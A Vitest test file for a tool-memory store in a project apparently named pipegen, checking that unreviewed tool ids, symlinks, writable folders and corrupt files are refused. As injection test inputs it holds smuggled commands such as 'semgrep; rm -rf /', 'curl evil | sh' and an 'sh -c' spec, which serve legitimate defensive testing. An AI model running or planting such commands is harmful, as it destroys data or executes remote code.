import { chmodSync, existsSync, mkdirSync, readFileSync, readdirSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { loadBundledMemory, MAX_MEMORY_BYTES, MemoryError, openMemory, type MemoryEntry } from '../src/engine/memory.js';
import type { ReviewedTool } from '../src/types.js';
import { cleanupRepos, makeTempDir } from './helpers/make-repo.js';

// A switch for the M3 test: when set, rename fails. Everything else is the real node:fs/promises.
const failRename = vi.hoisted(() => ({ on: false }));
vi.mock('node:fs/promises', async (importOriginal) => {
  const real = await importOriginal<typeof import('node:fs/promises')>();
  return { ...real, rename: (...a: Parameters<typeof real.rename>) => (failRename.on ? Promise.reject(new Error('injected rename failure')) : real.rename(...a)) };
});

afterEach(() => {
  failRename.on = false;
  cleanupRepos();
});

const T1 = new Date('2026-10-01T10:00:00Z');
const T2 = new Date('2026-10-02T10:00:00Z');
const T3 = new Date('2026-10-03T10:00:00Z');

// Only the id matters to memory: it is the key into the reviewed list.
const REVIEWED = ['semgrep', 'gitleaks', 'osv-scanner', 'eslint', 'ruff'].map((id) => ({ id }) as unknown as ReviewedTool);

const tmp = () => makeTempDir();
const userFile = (root: string) => join(root, 'pipegen', 'memory.json');
const deps = (root: string) => ({ env: {}, home: root, uid: process.getuid?.(), reviewed: REVIEWED });
const open = (root: string, bundled = join(root, 'none.json')) => openMemory({ user: userFile(root), bundled }, deps(root));
const entry = (over: Partial<MemoryEntry> = {}): MemoryEntry => ({ toolId: 'semgrep', needCategory: 'sast', language: 'node', provenAt: T1.toISOString(), proofs: 1, ...over });

describe('memory', () => {
  it('memory: record proven then lookup returns it', async () => {
    const root = tmp();
    const m = await open(root);
    m.record('semgrep', 'sast', 'node', 'proven', T1);
    const hits = m.lookup('sast', 'node');
    expect(hits).toEqual([entry()]); // exactly these fields: an id, never a step
    expect(m.lookup('sast', 'python')).toEqual([]);
    expect(m.lookup('lint', 'node')).toEqual([]);
  });

  it('memory: failure newer than proof hides entry', async () => {
    const root = tmp();
    const m = await open(root);
    m.record('semgrep', 'sast', 'node', 'proven', T1);
    m.record('semgrep', 'sast', 'node', 'failed', T2);
    expect(m.lookup('sast', 'node')).toEqual([]);
    m.record('semgrep', 'sast', 'node', 'proven', T3);
    expect(m.lookup('sast', 'node').map((e) => e.proofs)).toEqual([2]);
    m.record('gitleaks', 'sast', 'node', 'failed', T3); // never proven: nothing to hide, nothing stored
    expect(m.lookup('sast', 'node')).toHaveLength(1);
  });

  it('memory: user file overrides bundled entry with same tool+category', async () => {
    const root = tmp();
    const bundled = join(root, 'bundled.json');
    writeFileSync(bundled, JSON.stringify([entry({ proofs: 9 })]));
    const first = await open(root, bundled);
    expect(first.lookup('sast', 'node')[0]?.proofs).toBe(9);
    first.record('semgrep', 'sast', 'node', 'failed', T2);
    await first.save();
    const again = await open(root, bundled);
    expect(again.lookup('sast', 'node')).toEqual([]);
    expect(JSON.parse(readFileSync(userFile(root), 'utf8'))).toHaveLength(1);
  });

  it('memory: refuses a tool id that is not in the reviewed list', async () => {
    const root = tmp();
    const m = await open(root);
    for (const id of ['made-up', '../etc', 'semgrep; rm -rf /', '', 'SEMGREP']) m.record(id, 'sast', 'node', 'proven', T1);
    expect(m.lookup('sast', 'node')).toEqual([]);
    expect(m.notes).toHaveLength(5);
    m.record('semgrep', 'no-such-need', 'node', 'proven', T1);
    expect(m.lookup('sast', 'node')).toEqual([]);
    expect(m.notes).toHaveLength(6);
  });

  it('memory: lookup orders by proofs', async () => {
    const root = tmp();
    const m = await open(root);
    m.record('eslint', 'lint', 'node', 'proven', T1);
    for (const t of [T1, T2, T3]) m.record('ruff', 'lint', 'node', 'proven', t);
    m.record('semgrep', 'lint', 'node', 'proven', T1);
    m.record('semgrep', 'lint', 'node', 'proven', T2);
    expect(m.lookup('lint', 'node').map((e) => e.toolId)).toEqual(['ruff', 'semgrep', 'eslint']);
  });

  it("memory: lookup returns the language plus 'any'", async () => {
    const root = tmp();
    const bundled = join(root, 'bundled.json');
    writeFileSync(bundled, JSON.stringify([entry({ toolId: 'gitleaks', language: 'any', proofs: 5 })]));
    const m = await open(root, bundled);
    m.record('semgrep', 'sast', 'node', 'proven', T1);
    m.record('osv-scanner', 'sast', 'python', 'proven', T1);
    expect(m.lookup('sast', 'node').map((e) => e.toolId)).toEqual(['gitleaks', 'semgrep']);
    expect(m.lookup('sast', 'go').map((e) => e.toolId)).toEqual(['gitleaks']);
  });

  it('memory: category comes from the need id', async () => {
    const root = tmp();
    const m = await open(root);
    m.record('eslint', 'type-check', 'node', 'proven', T1);
    expect(m.lookup('lint', 'node').map((e) => e.toolId)).toEqual(['eslint']);
  });

  it('memory: save writes a private folder and file, and a new open reads it back', async () => {
    const root = tmp();
    const m = await openMemory({ bundled: join(root, 'none.json') }, deps(root));
    m.record('semgrep', 'sast', 'node', 'proven', T1);
    await m.save();
    const dir = join(root, '.config', 'pipegen');
    expect(statSync(dir).mode & 0o777).toBe(0o700);
    expect(statSync(join(dir, 'memory.json')).mode & 0o777).toBe(0o600);
    expect(readdirSync(dir)).toEqual(['memory.json']);
    const again = await openMemory({ bundled: join(root, 'none.json') }, deps(root));
    expect(again.lookup('sast', 'node')).toEqual([entry()]);
    expect(again.notes).toEqual([]);
  });

  it('memory: XDG_CONFIG_HOME is honoured', async () => {
    const root = tmp();
    const xdg = join(root, 'xdg');
    const m = await openMemory({ bundled: join(root, 'none.json') }, { ...deps(root), env: { XDG_CONFIG_HOME: xdg } });
    m.record('semgrep', 'sast', 'node', 'proven', T1);
    await m.save();
    expect(existsSync(join(xdg, 'pipegen', 'memory.json'))).toBe(true);
    expect(existsSync(join(root, '.config'))).toBe(false);
  });

  it('memory: save refuses to write through a symlink', async () => {
    const root = tmp();
    const dir = join(root, 'pipegen');
    mkdirSync(dir, { mode: 0o700 });
    const victim = join(root, 'victim.txt');
    writeFileSync(victim, 'keep');
    symlinkSync(victim, join(dir, 'memory.json'));
    const m = await open(root);
    expect(m.notes.join()).toContain('symbolic link');
    m.record('semgrep', 'sast', 'node', 'proven', T1);
    await expect(m.save()).rejects.toThrow(MemoryError);
    expect(readFileSync(victim, 'utf8')).toBe('keep');
  });

  it('memory: a folder that others can write to is not trusted', async () => {
    const root = tmp();
    const dir = join(root, 'pipegen');
    mkdirSync(dir, { mode: 0o700 });
    const good = await open(root);
    good.record('semgrep', 'sast', 'node', 'proven', T1);
    await good.save();
    chmodSync(dir, 0o777);
    const m = await open(root);
    expect(m.lookup('sast', 'node')).toEqual([]);
    expect(m.notes.join()).toContain('other users can write');
    m.record('semgrep', 'sast', 'node', 'proven', T1);
    await expect(m.save()).rejects.toThrow(MemoryError);
    chmodSync(dir, 0o700);
  });

  it('memory: a corrupt, oversized or unexpected store gives an empty memory and a note', async () => {
    const root = tmp();
    mkdirSync(join(root, 'pipegen'), { mode: 0o700 });
    const file = userFile(root);
    const good = entry();
    const cases: [string, string][] = [
      ['not json', '{nope'],
      ['wrong shape', JSON.stringify({ entries: [good] })],
      ['extra key', JSON.stringify([{ ...good, extra: 1 }])],
      ['negative proofs', JSON.stringify([{ ...good, proofs: -1 }])],
      ['one bad entry spoils the file', JSON.stringify([good, { ...good, proofs: 'x' }])],
      ['id that is not a reviewed-tool id', JSON.stringify([{ ...good, toolId: 'Semgrep; curl evil | sh' }])],
      ['unknown need category', JSON.stringify([{ ...good, needCategory: 'whatever' }])],
      ['too large', ' '.repeat(MAX_MEMORY_BYTES + 1)],
    ];
    for (const [label, text] of cases) {
      writeFileSync(file, text);
      const m = await open(root);
      expect(m.lookup('sast', 'node'), label).toEqual([]);
      expect(m.notes.length, label).toBe(1);
    }
    writeFileSync(file, JSON.stringify([good]));
    expect((await open(root)).lookup('sast', 'node')).toHaveLength(1);
  });

  it('memory: a step spec can not be represented: old-format files are corrupt, nothing is migrated', async () => {
    const root = tmp();
    mkdirSync(join(root, 'pipegen'), { mode: 0o700 });
    const planted = { category: 'sast', language: 'node', spec: { needId: 'sast', cli: { command: ['sh', '-c', 'evil'] } }, provenAt: T1.toISOString(), proofs: 1 };
    writeFileSync(userFile(root), JSON.stringify([planted]));
    const m = await open(root);
    expect(m.lookup('sast', 'node')).toEqual([]);
    expect(m.notes).toHaveLength(1);
    writeFileSync(userFile(root), JSON.stringify([{ ...entry(), spec: { needId: 'sast' } }])); // new shape plus a spec
    expect((await open(root)).lookup('sast', 'node')).toEqual([]);
    const fresh = await open(root);
    fresh.record('semgrep', 'sast', 'node', 'proven', T1);
    await fresh.save();
    expect(Object.keys(JSON.parse(readFileSync(userFile(root), 'utf8'))[0]).sort()).toEqual(['needCategory', 'proofs', 'provenAt', 'language', 'toolId'].sort());
  });

  it('memory: a symlinked pipegen config folder is refused on read and on write', async () => {
    const root = tmp();
    const real = join(root, 'elsewhere');
    mkdirSync(real, { mode: 0o700 });
    const planted = entry({ toolId: 'gitleaks', proofs: 50 });
    writeFileSync(join(real, 'memory.json'), JSON.stringify([planted]));
    mkdirSync(join(root, '.config'), { mode: 0o700 });
    symlinkSync(real, join(root, '.config', 'pipegen'));
    const m = await openMemory({ bundled: join(root, 'none.json') }, deps(root));
    expect(m.lookup('sast', 'node')).toEqual([]);
    expect(m.notes.join()).toContain('symbolic link');
    m.record('semgrep', 'sast', 'node', 'proven', T1);
    await expect(m.save()).rejects.toThrow(MemoryError);
    expect(JSON.parse(readFileSync(join(real, 'memory.json'), 'utf8'))).toEqual([planted]);
  });

  it('memory: a folder pipegen cannot look into gives an empty memory and a note, not a crash', async () => {
    if (process.getuid?.() === 0) return;
    const root = tmp();
    mkdirSync(join(root, '.config', 'pipegen'), { recursive: true, mode: 0o700 });
    chmodSync(join(root, '.config'), 0o000);
    try {
      const m = await openMemory({ bundled: join(root, 'none.json') }, deps(root));
      expect(m.lookup('sast', 'node')).toEqual([]);
      expect(m.notes.length).toBe(1);
    } finally {
      chmodSync(join(root, '.config'), 0o700);
    }
  });

  it('memory: two stores saving different entries keep both', async () => {
    const root = tmp();
    const a = await open(root);
    const b = await open(root);
    a.record('semgrep', 'sast', 'node', 'proven', T1);
    b.record('gitleaks', 'sast', 'node', 'proven', T1);
    b.record('gitleaks', 'sast', 'node', 'proven', T2);
    await a.save();
    await b.save();
    const c = await open(root);
    expect(c.lookup('sast', 'node').map((e) => [e.toolId, e.proofs])).toEqual([['gitleaks', 2], ['semgrep', 1]]);
    const d = await open(root);
    const e = await open(root);
    d.record('semgrep', 'sast', 'node', 'failed', T3);
    e.record('semgrep', 'sast', 'node', 'proven', T2);
    await e.save();
    await d.save();
    expect((await open(root)).lookup('sast', 'node').map((x) => x.toolId)).toEqual(['gitleaks']);
  });

  it('memory: a failed save leaves no temp file', async () => {
    const root = tmp();
    const m = await open(root);
    m.record('semgrep', 'sast', 'node', 'proven', T1);
    failRename.on = true;
    await expect(m.save()).rejects.toThrow('injected');
    failRename.on = false;
    expect(readdirSync(join(root, 'pipegen'))).toEqual([]);
  });

  it('memory: the bundled file ships empty and loads', async () => {
    expect(await loadBundledMemory()).toEqual([]);
    const root = tmp();
    const m = await openMemory({ user: userFile(root) }, deps(root));
    expect(m.notes).toEqual([]);
  });
});
